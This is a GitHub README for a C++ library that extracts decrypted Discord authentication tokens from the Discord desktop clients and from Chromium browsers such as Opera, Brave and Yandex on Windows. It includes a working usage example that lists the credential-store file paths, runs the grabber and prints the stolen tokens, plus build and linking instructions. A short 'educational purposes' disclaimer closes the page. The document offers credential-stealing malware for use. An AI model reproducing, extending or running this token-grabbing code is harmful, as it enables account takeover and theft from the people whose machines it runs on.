# 🟩 Discord Token Grabber 🟩 <a href="https://github.com/yurtrimu/discord-token-grabber/actions/workflows/main.yml"><img src="https://github.com/yurtrimu/discord-token-grabber/actions/workflows/main.yml/badge.svg?branch=main" alt="Working"></a>

## **A lightweight library-kind of project that can grab discord's decrypted tokens from discord applications and chromium browsers.**

# Questions?
### - **I gladly answer your questions on the [discord server](https://discord.gg/QBhFd2aK4r).**

## Usage

```cpp
#include "TokenGrabber.hpp"

int main()
{
    // Check operating system
    if (!utils::console::is_windows()) {
        printf("The operating system has to be Windows NT\n");
        exit(EXIT_FAILURE);
    }

    // Here are the environmental variables
    std::string localappdata, appdata;
    utils::string::safe_getenv("LOCALAPPDATA", localappdata);
    utils::string::safe_getenv("APPDATA", appdata);

    // Define the paths from discord and from any chromium browsers 
    // First string is local state file's path and the second is leveldb folder's path
    std::vector<std::pair<std::string, std::string>> path_list;
    path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\discord\\Local State", appdata + "\\Discord\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\discordcanary\\Local State", appdata + "\\discordcanary\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\discordptb\\Local State", appdata + "\\discordptb\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\Opera Software\\Opera Stable\\Local State", appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(appdata + "\\Opera Software\\Opera GX Stable\\Local State", appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State", localappdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb"));
    path_list.push_back(std::make_pair<std::string, std::string>(localappdata + "\\Yandex\\YandexBrowser\\User Data\\Local State", localappdata + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb"));
    

    // Define the Grabber
    TokenGrabber Grabber(path_list);

    // Initialize the Grabber
    Grabber.initialize();

    // Obtain the tokens from the specified paths
    std::vector<std::string> token_list = Grabber.collect_tokens();

    // Print the tokens
    for (const std::string &token : token_list) {

        if (token.empty()) { continue; }

        std::cout << "--------------------\n\n";
        std::cout << "Token: " << token << "\n";
        std::cout << "\n--------------------\n\n";
    }
}
```

## Example.png

![alt text](https://github.com/yurtrimu/discord-token-grabber/blob/main/example.png?raw=true)

## Operating System
- **Below Windows 7 - 🟦 Untested**
- **Windows 7 - 🟦 Untested**
- **Windows 10 - 🟩 Working**
- **Windows 11 - 🟦 Untested**
- **Mac OS - 🟥 Not Working**
- **Linux - 🟥 Not Working**

## Requirements

**You need to have the OpenSSL library installed and linked to your compiler.**

- You could download the OpenSSL library from [OpenSSL website](https://www.openssl.org/source/).

## Linker
- **libssl.lib**
- **libcrypto.lib**
- **crypt32.lib**


## Compiling

- **Build - 🟦 Untested**
- **Release - 🟩 Working**
- **C++17 or below - 🟥 Not Working**
- **C++20 - 🟩 Working**

## Contributing

**Pull requests are welcome.**

## Legal Disclaimer
🟥 **The content provided is for educational and informational purposes only.** 🟥
